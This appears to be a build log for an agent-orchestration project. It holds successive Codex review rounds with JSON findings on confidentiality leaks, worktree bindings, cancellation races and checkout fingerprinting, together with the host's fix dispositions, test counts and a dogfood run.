   "evidence": "Reuse checks reconstruct the worktree path from current configuration and compare only base_sha with the durable binding. If AGENTIC_OS_WORKTREES changes and a replacement worktree is created there from the same unchanged HEAD, retry accepts it despite the persisted worktree naming the original location. The immutable store retains the old path while the new run records and executes the replacement.",
   "fix": "Validate the complete persisted project/ticket/worktree/branch/base binding before launching. Require explicit recovery when configuration points to a different worktree instead of accepting matching base commits."
  },
  {
   "id": "MPD-I7-07",
   "severity": "medium",
   "path": "runner/app.py:2656",
   "evidence": "The new cancellation fingerprint handles differences but not snapshot failures. For example, an unsandboxed agent corrupts the main checkout's index and is then cancelled: fingerprint raises, the outer handler leaves result empty, and cancellation subsequently replaces the error with 'Cancelled by user'. The final record has neither a failed safety badge nor evidence that the main checkout could not be checked, contrary to Decision 1's fail-closed snapshot rule.",
   "fix": "Capture closing-fingerprint failures as persistent safety-result fields and force a failing badge while preserving the cancelled or stalled lifecycle status. Apply the same handling to post_run's closing fingerprint."
  }
 ],
 "coverage": [
  "Verified all 11 manifest file hashes, the supplied plan hash and tracked diff hash; HEAD is d47a83e961690ace074aefefd7795dab7f6aa017.",
  "Inspected every manifest file's changes and relevant surrounding implementation, including all three changed test files and the I6 dispositions.",
  "Traced binding lookup and persistence through dispatch, retry, feedback, PTY resume and CLI verification.",
  "Traced process creation, cancellation, reaping, shutdown, closing fingerprints and final record writers.",
  "Traced poller/reset ordering, placeholder replacement, dashboard edit callers, LocalTracker transactions, reset generations, state_io and run_skill state writes. No concrete lock-order deadlock was identified in the inspected paths.",
  "Source supports the targeted retry-feedback, declared-confidentiality, fixed-error redaction, agent/verifier SIGKILL escalation and post-verify dirty checks. The I6-06 rejection is consistent with the existing cancel route's In Review behavior."
 ],
 "limitations": [
  "Static review only: no files edited, tests executed, runtime probes performed or work delegated. Reported test results were not independently verified.",
  "Private registry contents, project repositories, session stores and sandbox spike artifacts were not inspected.",
  "Earlier phases were inspected where they interact with these fixes; outstanding dogfood and session-picker acceptance checks remain unverified."
 ]
}
```

### Host dispositions (6 accepted, 1 rejected, 2026-10-15)
- I7-01 rejected with evidence: no run record anywhere carries a project binding (`state/run_log.jsonl` 184, `state/runs.jsonl` 362, `outputs/run_log.jsonl` 478 lines, 0 with `project_key`), and `state/issue_bindings.json` does not exist yet. Project dispatch has never run outside tests, so there is no history to migrate. A legacy record that does carry `project_key` still binds the retry through the existing fallback.
- I7-02 accepted: the worktree sidecar now records `confidential` (at creation, and `mark_confidential` whenever a run is confidential); `run_verify` applies `projects.effective()`, so `projects.py verify` and the dashboard confine the same tickets.
- I7-03 accepted: `_records_unsafe` treats a check that cannot run as unsafe (redacted record); the job stays in `_running_jobs` (phase `finalizing`) until its record is written, so shutdown waits for it.
- I7-04 accepted: the poller locks every polled or cached issue and computes the terminal snapshot inside the lock; any issue whose generation changed keeps its current entry and leaves the terminal set.
- I7-05 accepted: after the swap, edits made while the create was pending are pushed to Linear by the real id (`_linear_sync_patch`), and the local merged entry stays in the cache.
- I7-06 accepted: worktree, branch and base must all match the stored binding; otherwise the launch is refused.
- I7-07 accepted: `project_runs.closing_check` records `main_checkout_changed: None` + `closing_check_error` and badges `main checkout unchecked`, in post_run and on cancel/stall.
- Test helper: each test ticket now has its own issue/task id (the stored-binding check correctly refused T-2 reusing T-1's issue).
- Tests: 5 new + 1 extended; pytest 296 passed.

## Build inspection 8 — fresh Codex reinspection of the I7 fixes (2026-10-15)
- Fresh Codex session 01a13ea6-1e01-7341-b060-03c6afb134d1, base d47a83e, cross-provider, 291 s. Result `/private/tmp/claude-501/-Users-yanghu-Documents-AI-Workspace-prototypes-agentic-os/aff7570e-fb57-4e68-b06f-89245cb7eb36/scratchpad/claudex/i8/claudex-0idew_sz/result.json`.
- Verdict: **REVISE**, 7 findings.

```json
{
 "verdict": "REVISE",
 "summary": "The I7-01 rejection is supported by the local records. The fixes address several original failures, but confidentiality policy, pending-create synchronization, cancellation and safety badges still have concrete gaps.",
 "findings": [
  {
   "id": "MPD-I8-01",
   "severity": "high",
   "path": "runner/projects.py:693",
   "evidence": "Only run_verify consumes the new sidecar confidentiality flag. Create a confidential worktree with projects.py worktree, then change the registry flag to false. With no dashboard issue binding, PTY resume checks only the registry and issue_bindings.json, discards load_binding's returned metadata, and builds unsandboxed Claude argv (runner/modules/pty/__init__.py:301-322). First dashboard dispatch into that worktree likewise ignores its confidential sidecar. CLI verification remains confined while agent execution can lose confinement.",
   "fix": "Resolve registry, sidecar and durable confidentiality through one shared helper under the ticket lock before agent launch, resume, runner Git operations or verification. Persist promotions made through CLI verification as well."
  },
  {
   "id": "MPD-I8-02",
   "severity": "medium",
   "path": "runner/modules/linear/__init__.py:860",
   "evidence": "A title-only edit during creation can erase the issue's existing description and agent marker. The real create mutation returns no description (runner/linear_client.py:98-103), so normalization supplies an empty description and no preferred_agent. The swap retains only fields changed from local_issue; unchanged original description and agent are omitted. The new replay then sends description=\"\" alongside the edited title, clearing the real description. FakeLinearClient returns a description, masking this scenario.",
   "fix": "Fetch the complete created issue or preserve original fields omitted from the create response. Replay only fields actually edited while pending. Cover a title-only edit with the real mutation response shape."
  },
  {
   "id": "MPD-I8-03",
   "severity": "medium",
   "path": "runner/modules/linear/__init__.py:865",
   "evidence": "Pending edits still disappear after a failed replay. _linear_sync_patch returns no acknowledgement and silently returns when fetch_issue fails; update failures also return None/False without being checked. The caller nevertheless finishes synchronization, with no retry retained. After the migrated 60-second override expires, polling replaces the local edited fields with Linear's original values through _sync_cache_to_local. This leaves I7-05's acknowledgement requirement unresolved.",
   "fix": "Persist pending edits until the remote fields are acknowledged, propagate synchronization success or failure, and retry failures. Verify preservation through failed requests followed by polling after the override TTL."
  },
  {
   "id": "MPD-I8-04",
   "severity": "medium",
   "path": "runner/modules/linear/__init__.py:865",
   "evidence": "The pending-create replay can undo a newer reset. The swap emits id_map before replaying its saved n. If a Todo PATCH completes after publication but before reset_gen.current(real_id), the stale In Progress replay is stamped with the new generation and passes the generation check. Additionally, issues_cache[real_id] = n runs outside the issue lock after synchronization and can overwrite a newer reset's cache entry.",
   "fix": "Capture the replay generation with its snapshot under the issue lock, reject stale state replay, and reconcile cache publication under that same lock. Do not restore an old n unconditionally after synchronization."
  },
  {
   "id": "MPD-I8-05",
   "severity": "medium",
   "path": "runner/project_runs.py:264",
   "evidence": "Cancellation during runner_commit or the initial uncommitted check makes stopped() return true. The early return executes closing_check in finally but skips all badge assignment below it. If the closing snapshot fails, the cancelled record contains main_checkout_changed=null and closing_check_error without 'main checkout unchecked'; a detected checkout change likewise has no failure badge. The dashboard renders safety warnings from verify_badge, so this I7-07 path remains hidden.",
   "fix": "Skip verification without returning before common result finalization, or assign the safety badge in a finally block that executes on every return path."
  },
  {
   "id": "MPD-I8-06",
   "severity": "medium",
   "path": "runner/app.py:2688",
   "evidence": "Keeping jobs registered during finalization exposes an acknowledged-but-ignored cancellation. The worker snapshots cancelled before _records_unsafe, which can run several Git subprocesses. DELETE during that check finds the registered project job, sets job['cancelled'] and returns 200. The worker continues using its earlier cancelled=None, writes review/error and posts a run comment. Shutdown can set the same ignored flag during this window.",
   "fix": "Serialize the transition into finalization with cancellation. Either reject cancellation once completion is committed, or honor cancellation through record creation and comment decisions; do not return success for a flag the worker will ignore."
  },
  {
   "id": "MPD-I8-07",
   "severity": "low",
   "path": "runner/modules/linear/__init__.py:443",
   "evidence": "The terminal-ticket reset fix preserves only the unfiltered cache. When a Done ticket is absent from the fetch and reset to Todo mid-fetch, it is added to new_cache, but inserted into a team dictionary only if already present there. It cannot be present in this scenario. GET /api/linear/issues?team_id=... uses _issues_by_team directly (lines 765-769), so the reset ticket disappears from the team board until a subsequent fetch includes it.",
   "fix": "Insert preserved entries into new_by_team using their team_id, including entries absent from the fetched snapshot. Extend the regression to inspect the team-filtered route."
  }
 ],
 "coverage": [
  "Verified all eight manifest file hashes, the supplied plan hash and tracked diff hash. Inspected HEAD 1cdd77201b6bc5c783fd716991bc93b13f101469.",
  "Reviewed every manifest file's changes and relevant surrounding source, both changed test files, the supplied plan and I7 dispositions.",
  "Independently confirmed I7-01 evidence: 184, 362 and 478 records in the three named logs, zero project bindings, and no state/issue_bindings.json.",
  "Traced sidecar and durable bindings through dispatch, retry, CLI verification, PTY resume, sandbox selection and record guards.",
  "Traced cancellation, shutdown, final logging, closing snapshots and dashboard badge rendering. I7-06's complete binding comparison is present.",
  "Traced poller publication, reset locks/generations, team-filtered reads, placeholder replacement, dashboard edit callers, actual Linear response shapes, LocalTracker transactions and shared-state writers."
 ],
 "limitations": [
  "Static review only: no files edited, tests run, runtime probes performed or work delegated. Reported test results were not independently verified.",
  "Private registry contents, project repositories, session stores and sandbox spike artifacts were not inspected.",
  "Earlier phases were reviewed only where they interact with these fixes. Dogfood and session-picker acceptance checks remain unverified."
 ]
}
```

### Host dispositions (2026-10-15)
- I8-01 accepted: `_effective_project(project, ident, meta)` = registry ∨ worktree sidecar ∨ durable binding (unknown counts). Used by the launch helper after `create_worktree` (a CLI-made confidential worktree promotes the run: records guard, persisted binding, sandboxed argv) and by PTY tabs/resume in a worktree (lock first, then policy, then the records guard). `run_verify` marks the sidecar when the registry is confidential, so a CLI promotion sticks.
- I8-02, I8-03, I8-04 resolved by scope: they concern the pending-create edit replay (I7-05) and merge (I6-12), host additions to a pre-existing local-first race that has nothing to do with project dispatch. A correct fix needs an acknowledged edit queue; that is its own plan. Both attempts reverted to the original swap (locked transaction from I5-05 kept, override migration kept); the plan records the gap as N/A with the reason.
- I8-05 accepted: post_run no longer returns early on cancel; verify is skipped, and the safety badges (`seed committed`, `main checkout unchecked/changed`) are always assigned; a clean cancelled run carries no badge.
- I8-06 accepted: `_JOB_LOCK` orders cancel/stall/shutdown against the switch to `finalizing`; the helper reads `cancelled` under it; a later cancel gets 409 "already finishing" and shutdown leaves finalizing jobs alone.
- I8-07 accepted: preserved entries are reinserted into `new_by_team` by their team_id.
- Tests: 3 new, 1 extended, 1 removed (the reverted pending-edit test); pytest 298 passed.

## Build inspection 9 — fresh Codex reinspection of the I8 fixes (2026-10-15)
- Fresh Codex session 01a13eae-033e-76f0-b8ac-7fb60ee496a2, base 1cdd772, cross-provider, 161 s. Result `/private/tmp/claude-501/-Users-yanghu-Documents-AI-Workspace-prototypes-agentic-os/aff7570e-fb57-4e68-b06f-89245cb7eb36/scratchpad/claudex/i9/claudex-cmx1wohj/result.json`.
- Verdict: **REVISE**, 2 findings (the I8-02/03/04 scope resolution was not re-raised).

```json
{
 "verdict": "REVISE",
 "summary": "I8-05/06/07 are supported by the inspected code. I8-01 fixes successful dispatch and resume, but confidential sidecar policy still misses error and feedback paths.",
 "findings": [
  {
   "id": "MPD-I9-01",
   "severity": "high",
   "path": "runner/app.py:2663",
   "evidence": "Sidecar confidentiality is resolved only after ticket-lock acquisition and create_worktree validation. Create a confidential worktree through the CLI, change the registry flag to false, then dispatch while a resume tab holds its lock. The lock refusal bypasses _effective_project, leaving binding.confidential=false. Finalization skips the record-location guard and tracker_comment posts the full prompt/error to Linear (lines 2720\u20132736). Missing seeds or a switched branch produce the same leak before promotion.",
   "fix": "Keep confidentiality unknown until all policy sources are resolved. Resolve sidecar policy before fallible worktree validation, and conservatively redact error records/comments when the ticket lock or policy cannot be inspected. Persist any discovered promotion before proceeding."
  },
  {
   "id": "MPD-I9-02",
   "severity": "high",
   "path": "runner/projects.py:695",
   "evidence": "CLI verification now persists confidentiality only in the worktree sidecar. After an initial non-confidential dashboard run, enable confidentiality, run CLI verify, then disable the registry flag. The sidecar remains true but issue_bindings.json remains false. Retry's _effective_confidential reads only the durable binding and registry (app.py:2519), so it posts private feedback/attachment details before the worker discovers the sidecar (app.py:3286\u20133295). LinearModule._is_confidential_issue likewise ignores the sidecar, allowing the comment endpoint to disclose feedback.",
   "fix": "Use the shared effective ticket policy for retry feedback and the Linear comment endpoint, including sidecar promotions. Ensure CLI promotions reach every confidentiality reader before outbound comments; later worker promotion cannot undo disclosure."
  }
 ],
 "coverage": [
  "Verified all nine manifest file hashes, the plan hash and tracked diff hash at HEAD bc2b9fc2e0550f440329cc593e3877ef061c8702.",
  "Reviewed every changed file's diff and relevant surrounding source, both changed test files, the supplied plan and review dispositions.",
  "Traced sidecar/durable policy through dispatch, CLI verification, PTY resume, retry feedback, comment gates and record-location checks.",
  "Traced cancellation, stall detection, shutdown, finalization, closing badges and dashboard callers.",
  "Traced poller team reinsertion, reset generations, placeholder replacement, LocalTracker transactions, state_io and related run-state writers.",
  "Confirmed removal of the pending-create merge/replay; did not re-raise the excluded pre-existing synchronization gap."
 ],
 "limitations": [
  "Static review only: no files edited, tests executed, runtime probes performed or work delegated. Reported test results were not independently verified.",
  "Private registries, project repositories, session stores and sandbox spike artifacts were not inspected.",
  "Earlier phases were inspected only where they interact with these fixes; dogfood and session-picker acceptance checks remain unverified."
 ]
}
```

### Host dispositions (both accepted, 2026-10-15)
- I9-01 and I9-02 have one root cause: confidentiality was read from different sources in different places. `_ticket_confidential(key, ident, issue, task, *known)` is now the single policy: current registry (lookup failure = unknown), the worktree sidecar via `projects.sidecar_confidential` (plain file read, no lock, no git; unreadable = unknown), and the durable binding, merged sticky. The launch helper resolves it before the registry lookup, the ticket lock and worktree validation, so a refused or failed launch already carries the right flag. Retry feedback, the Linear comment route (`_is_confidential_issue`) and PTY tabs (`_effective_project`) call the same function. The post-create promotion block is gone (covered up front).
- Tests: 2 new (locked CLI-confidential ticket posts only the template; a CLI-verify-only promotion gates retry feedback and the comment route). pytest 300 passed.

## Build inspection 10 — fresh Codex reinspection of the I9 fixes (2026-10-15)
- Fresh Codex session 01a13eb4-a22b-7970-9e00-cf1e402c7a61, base bc2b9fc, cross-provider, 139 s. Result `/private/tmp/claude-501/-Users-yanghu-Documents-AI-Workspace-prototypes-agentic-os/aff7570e-fb57-4e68-b06f-89245cb7eb36/scratchpad/claudex/i10/claudex-1jxws_vg/result.json`.
- Verdict: **REVISE**, 2 findings.

```json
{
 "verdict": "REVISE",
 "summary": "The reported I9 scenarios are addressed, but two related paths still disclose confidential text.",
 "findings": [
  {
   "id": "MPD-I10-01",
   "severity": "high",
   "path": "runner/app.py:2648",
   "evidence": "An unreadable or malformed worktree sidecar makes _ticket_confidential return None. If the registry remains valid and currently says confidential=false, this line converts that unknown policy to False. Worktree validation then fails, but finalization skips confidential record protection and tracker_comment invokes the fallback containing the full prompt. A CLI-created confidential worktree with damaged metadata and a subsequently disabled registry flag triggers this without any dashboard binding.",
   "fix": "Preserve the unknown value. Refuse execution or apply confidential safeguards until every policy source is resolved; never convert None to False merely because the registry lookup succeeded. Cover the malformed-sidecar error path."
  },
  {
   "id": "MPD-I10-02",
   "severity": "high",
   "path": "runner/modules/linear/__init__.py:548",
   "evidence": "The unbound branch still reads only registry confidentiality. Create a confidential ticket worktree through projects.py, then disable the registry flag before its first dashboard dispatch. CLI creation leaves a confidential sidecar but creates no issue_bindings.json entry. For the labelled issue, _is_confidential_issue returns False, allowing POST /api/linear/issues/<issue_id>/comment to send private feedback and attachment details to Linear.",
   "fix": "Use _ticket_confidential for the unbound labelled branch too, supplying the cached issue identifier. Resolve missing identifiers conservatively before permitting outbound comments. Cover a CLI-confidential worktree with no dashboard binding."
  }
 ],
 "coverage": [
  "Verified all seven manifest file hashes, the plan hash and the tracked diff hash.",
  "Reviewed the supplied plan, review dispositions, every changed file's diff, relevant surrounding implementation and the changed test file.",
  "Traced registry, sidecar and durable policy through dispatch, retry feedback, comment endpoints, PTY resume and CLI verification.",
  "Inspected related binding and record writers, state_io transactions, LocalTracker comment storage, run_skill state writes and reset-generation handling."
 ],
 "limitations": [
  "Static review only: no files edited, tests run, runtime probes performed or work delegated. Reported test results were not independently verified.",
  "Private registries, project repositories, session stores and sandbox spike artifacts were not inspected.",
  "Earlier phases were inspected only where they interact with these fixes; dogfood and session-picker acceptance checks remain unverified."
 ]
}
```

### Host dispositions (both accepted, 2026-10-15)
- I10-01: the launch helper no longer collapses an unknown policy to False after a successful registry lookup; `binding["confidential"]` keeps None, and every check uses `is not False` (sandboxed project, records guard, sidecar marking, template comments).
- I10-02: the unbound labelled branch of `_is_confidential_issue` calls `_ticket_confidential(key, identifier, issue)`; a labelled issue with no identifier fails closed.
- Tests: 2 new (damaged sidecar keeps the run unknown and posts only the template; a CLI-made confidential worktree gates the comment route before any dashboard run). pytest 302 passed.

## Build inspection 11 — fresh Codex reinspection of the I10 fixes (2026-10-15)
- Fresh Codex session 01a13eb9-95f5-7063-971b-51bb3eaa3177, base 9959b6b, cross-provider, 99 s. Result `/private/tmp/claude-501/-Users-yanghu-Documents-AI-Workspace-prototypes-agentic-os/aff7570e-fb57-4e68-b06f-89245cb7eb36/scratchpad/claudex/i11/claudex-_nuv_2c_/result.json`.
- Verdict: **APPROVED**, 0 findings.

```json
{
 "verdict": "APPROVED",
 "summary": "I10-01 and I10-02 are addressed. No material unresolved defects found in the fixes or their inspected interactions.",
 "findings": [],
 "coverage": [
  "Verified all five manifest file hashes, including the plan, and the tracked diff hash.",
  "Reviewed the supplied plan, dispositions, changed files and relevant surrounding implementation.",
  "Traced unknown confidentiality through dispatch, binding persistence, record-location guards, finalization and tracker comments.",
  "Traced labelled comment requests, retry feedback, CLI sidecar creation and promotion, and terminal resume policy.",
  "Inspected related shared-state readers and writers in projects.py, project_runs.py, state_io.py, LocalTracker and run_skill.py."
 ],
 "limitations": [
  "Static review only; no edits, tests, runtime probes or delegation. Reported test results were not independently verified.",
  "Private registries, project repositories, session stores and sandbox spike artifacts were not inspected.",
  "Approval covers this reinspection scope; outstanding dogfood, project-baseline and session-picker acceptance checks remain unverified."
 ]
}
```

### Inspection chain summary
- Inspection 5 covered the whole build since a8ab382 (Phases 0-3, Decision 11, 4b) cross-provider; inspections 6-11 each reinspected the previous round of fixes in a fresh Codex session. Findings per round: 14, 13, 7, 7, 2, 2, 0. Assurance: cross_provider. 11 of 20 inspection rounds used.
- Not covered by any inspection: the dogfood run, the R-project baseline and the session-picker spot-check (all blocked on the user).

## Dogfood (2026-10-15)
- User decisions: squash the branch before any push; `/run` launch helper N/A; the R projects' `.gitignore` committed locally only (no push); Claude creates the dogfood tickets itself.
- R project A: committed `.gitignore` for its seed dirs (local commit). Baseline in a fresh seeded worktree failed 2 tests under `env -i`: R `sort()` is locale-dependent and launchd sets no LANG. Registry env `LANG=en_US.UTF-8` (gitignored registry) → pass, 28 s. R project B had the same 2 failures on its first dogfood run; same fix → 1031 pass.
- Tickets AGE-98/99/100 (one per registered project), read-only prompts, dispatched through `PATCH /api/linear/issues/<id>` with `state_name: In Progress` (the poller alone does not dispatch).
- Finding: Claude Code 2.1.300 creates an empty `.claude/.cc-writes/` (its settings-write staging dir) in the main checkout for a sandboxed worktree run. Settings files unchanged. The fingerprint caught it where `.claude/` is gitignored; it missed it where `.claude/` is untracked (git lists no empty dirs). Fix: `bookkeeping_paths` always excludes `.claude/.cc-writes/`; settings files still count. Test added; pytest 303 passed.
- Retry of AGE-98 on the fixed runner: verify pass, `main_checkout_changed: false`, no uncommitted files.
- Linear: confidential tickets got only `AgenticOS Run / status / verify`; the knowledge-base ticket got the full prompt/output. All three moved to Done; all three worktrees and `agent/*` branches cleaned up (knowledge base via a dashboard terminal, which has the TCC access this shell lacks).
- Browser check of the board card skipped: the DevTools browser was held by another session. `/api/runs` returns `verify_badge` and `index.html` renders it.

## Build inspection 12 — fresh Codex inspection of the dogfood fix (2026-10-15)
- Fresh Codex session 01a13fd6-ca77-79b2-855e-830e6c6e4f4f, base 69fc0e3, cross-provider, 117 s. Result `/private/tmp/claude-501/-Users-yanghu-Documents-AI-Workspace-prototypes-agentic-os/aff7570e-fb57-4e68-b06f-89245cb7eb36/scratchpad/claudex/i12/claudex-y3j6j9e8/result.json`.
- Verdict: **REVISE**, 1 finding.

```json
{
 "verdict": "REVISE",
 "summary": "The exclusion hides persistent files and symlinks, although the reported false positive requires ignoring only an empty directory.",
 "findings": [
  {
   "id": "MPD-I12-01",
   "severity": "medium",
   "path": "runner/project_runs.py:314",
   "evidence": "The unconditional directory-prefix exclusion suppresses every untracked or ignored descendant through runner/projects.py:634-664. An unsandboxed agent or verifier can accidentally leave a file in the main checkout at .claude/.cc-writes/result.txt without changing any other fingerprinted path. The closing check then reports main_checkout_changed=false and verification can remain pass. The added test explicitly demonstrates this by creating a nonempty tmp file and asserting an unchanged fingerprint. The same predicate also suppresses a regular file or symlink occupying .claude/.cc-writes itself.",
   "fix": "Special-case only the metadata of the actual, non-symlink staging directory; continue fingerprinting its descendants and any file or symlink at that path. Cover empty-directory creation, persistent contents, and symlink replacement under both ignored-directory walking and untracked-file listing."
  }
 ],
 "coverage": [
  "Verified SHA256 values for all four manifest files and confirmed the changed-file list against the supplied base.",
  "Read the supplied plan, changed implementation and test files, and relevant review-log history and dispositions.",
  "Traced exclusions through fingerprint generation, post-run and cancellation closing checks, dispatch and retry callers, run-record persistence, and dashboard badge rendering.",
  "Inspected related verifier execution and existing fingerprint/bookkeeping tests. Prefix boundaries preserve sibling settings paths; tracked changes remain covered by Git diffs."
 ],
 "limitations": [
  "Static review only: no edits, tests, runtime probes, or delegation. Reported passing tests were not independently verified.",
  "Claude CLI staging internals, private project repositories, and dogfood evidence were not independently inspected.",
  "Review covers this change and its interactions, not a fresh audit of every earlier implementation phase."
 ]
}
```

### Host dispositions (accepted, 2026-10-15)
- I12-01: accepted. `bookkeeping_paths` no longer excludes the staging prefix. `fingerprint` skips only the stat entry of `.claude/.cc-writes` when it is a real directory (`CLAUDE_STAGING` in projects.py); descendants, a file or symlink at that path, and settings files still count. Test parametrized over ignored and untracked `.claude/`. pytest 304 passed.

## Build inspection 13 — fresh Codex reinspection of the I12 fix (2026-10-15)
- Fresh Codex session 01a13fda-f00d-7df1-942c-556067cb3919, base 557f108, cross-provider, 81 s. Result `/private/tmp/claude-501/-Users-yanghu-Documents-AI-Workspace-prototypes-agentic-os/aff7570e-fb57-4e68-b06f-89245cb7eb36/scratchpad/claudex/i13/claudex-kyjx42t4/result.json`.
- Verdict: **APPROVED**, 0 findings.

```json
{
 "verdict": "APPROVED",
 "summary": "MPD-I12-01 is fixed. No material unresolved defects found in the fix or its inspected interactions.",
 "findings": [],
 "coverage": [
  "Verified all five manifest file hashes, the changed-file list and the tracked diff hash against the supplied base.",
  "Reviewed the plan, changed implementation and tests, and relevant review-log evidence.",
  "Checked ignored-directory traversal and untracked-file handling: staging contents, file and symlink replacements, and sibling settings remain fingerprinted.",
  "Traced dispatch, retry, post-run and cancellation checks through run-record persistence and dashboard badge rendering.",
  "Inspected related state writers and bookkeeping exclusions in app.py, run_skill.py, state_io.py, PTY handoffs and stall detection."
 ],
 "limitations": [
  "Static review only; no edits, tests, runtime probes or delegation. Reported passing tests were not independently verified.",
  "Private projects, Claude staging internals and dogfood evidence were not independently inspected.",
  "Approval covers this fix and its interactions, not every earlier implementation phase or the outstanding session-picker acceptance check."
 ]
}
```
- Inspections used: 13 of 20. Still unverified by any inspection: the session-picker spot-check (needs the user).
